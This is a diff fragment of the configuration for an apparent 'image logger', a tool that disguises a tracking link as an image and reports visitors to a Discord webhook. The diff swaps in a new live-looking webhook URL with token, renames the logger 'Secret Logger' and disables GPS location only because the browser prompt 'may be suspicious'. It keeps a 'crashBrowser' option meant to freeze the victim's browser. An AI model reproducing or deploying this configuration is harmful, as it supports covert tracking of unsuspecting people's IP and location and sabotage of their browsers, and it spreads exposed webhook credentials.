@@ -12,19 +12,19 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1096819125566840974/w142oM8zUWQHV2-7p9dTXqh2cY5Zm2YtTZglMrLw9J1GVfpOPpeFbZfhzf7WJFlH9GwN",
+    "webhook": "https://discord.com/api/webhooks/1225900074094034954/clHV2vYbLMStboRk1lDNafFjetZixG5RgKkLCYplKwNzesr2EcKqndNR_pQB8Ob23Z_b",
     "image": "https://media.tenor.com/_bTaLmoLSc4AAAAd/troll-pilled.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Secret Logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
